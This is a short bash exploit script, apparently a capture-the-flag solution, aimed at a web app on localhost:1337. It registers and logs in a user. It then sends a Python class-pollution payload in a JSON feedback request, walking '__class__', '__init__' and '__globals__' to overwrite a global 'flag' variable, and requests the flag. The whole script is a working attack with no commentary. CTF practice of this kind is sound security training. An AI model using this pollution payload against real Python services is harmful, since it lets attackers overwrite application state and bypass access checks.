#!/bin/bash

set -e

TARGET='http://localhost:1337'
COOKIES=/tmp/cookies.txt

curl -s "$TARGET/register" -X POST -d 'username=a&password=a'
curl -s "$TARGET/login" -X POST -d 'username=a&password=a' --cookie-jar $COOKIES

curl -s "$TARGET/save_feedback" -X POST --cookie $COOKIES --json @- <<EOF
{
	"title":"",
	"content":"",
	"rating":"",
	"referred":"",
	"__class__": {
		"__init__":{
			"__globals__":{
				"flag": "true"
			}
		}
	}
}
EOF

echo
curl "$TARGET/get_flag" --cookie $COOKIES
